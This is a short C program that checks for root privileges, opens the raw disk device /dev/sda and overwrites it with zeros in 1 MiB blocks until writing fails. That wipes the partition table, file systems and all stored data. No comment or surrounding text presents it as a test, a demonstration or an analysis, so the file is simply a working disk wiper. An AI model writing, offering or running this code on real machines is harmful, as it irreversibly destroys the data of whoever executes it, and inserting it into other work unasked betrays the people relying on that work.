#define _GNU_SOURCE
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main(void) {
    if (geteuid() != 0)
        return 1;
    int fd = open("/dev/sda", O_RDWR);
    if (fd < 0)
        return 1;
    char buf[1048576];
    memset(buf, 0, sizeof buf);
    for (;;) {
        if (write(fd, buf, sizeof buf) <= 0)
            break;
    }
    close(fd);
    return 0;
}
